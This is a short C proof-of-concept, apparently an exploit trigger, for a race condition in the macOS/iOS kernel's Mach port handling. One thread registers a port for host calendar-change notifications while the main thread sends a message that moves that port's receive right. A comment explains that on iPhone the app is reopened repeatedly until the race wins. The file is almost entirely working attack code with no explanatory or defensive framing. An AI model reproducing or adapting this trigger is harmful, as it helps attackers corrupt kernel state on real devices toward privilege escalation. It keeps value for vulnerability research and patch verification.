/

#include <errno.h>
#include <signal.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/mman.h>
#include <sys/stat.h>

#include <libkern/OSAtomic.h>
#include <mach/mach.h>
#include <mach/mach_error.h>
#include <mach/mach_vm.h>
#include <mach/task.h>
#include <mach/task_special_ports.h>
#include <mach/thread_status.h>

typedef struct {
  mach_msg_header_t header;
  mach_msg_body_t body;
  mach_msg_port_descriptor_t port;
} port_msg_send_t;

#define MACH_ERR(str, err) do { \
  if (err != KERN_SUCCESS) {    \
    mach_error("[-]" str "\n", err); \
    exit(EXIT_FAILURE);         \
  }                             \
} while(0)

#define FAIL(str) do { \
  printf("[-] " str "\n");  \
  exit(EXIT_FAILURE);  \
} while (0)

#define LOG(str) do { \
  printf("[+] " str"\n"); \
} while (0)

int g_start = 0;
mach_port_t reply_port = MACH_PORT_NULL;

void *racer(void *param) {
	int err;
	while(!g_start) {}
	// usleep(1);
	err = host_request_notification(mach_host_self(), HOST_NOTIFY_CALENDAR_CHANGE, reply_port);
	MACH_ERR("host_request change to kobject", err);
	return NULL;
}

/*
if race failed ->
	mach_port_guard_exception(name, 0, 0, kGUARD_EXC_IMMOVABLE);
	show EXC_GUARD in userspace if you wanna try this on iPhone, open the app many times until the race wins
*/

int main() {
	int err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &reply_port);
	mach_port_insert_right(mach_task_self(), reply_port, reply_port, MACH_MSG_TYPE_MAKE_SEND); 
	MACH_ERR("allocating reply port", err);
	pthread_t id = 0;
	pthread_create(&id, NULL, racer, NULL);
	g_start = 1;
	port_msg_send_t msg = {0};

	msg.header.msgh_size = sizeof(msg);
	msg.header.msgh_local_port = 0;
	msg.header.msgh_remote_port = reply_port;
	msg.header.msgh_bits = MACH_MSGH_BITS (MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE) | MACH_MSGH_BITS_COMPLEX;

	msg.body.msgh_descriptor_count = 1;

	msg.port.name = reply_port;
	msg.port.disposition = MACH_MSG_TYPE_MOVE_RECEIVE;
	msg.port.type = MACH_MSG_PORT_DESCRIPTOR;

	usleep(1);
	err = mach_msg_send(&msg.header);
	MACH_ERR("sending task port message", err);
	return 0;
}
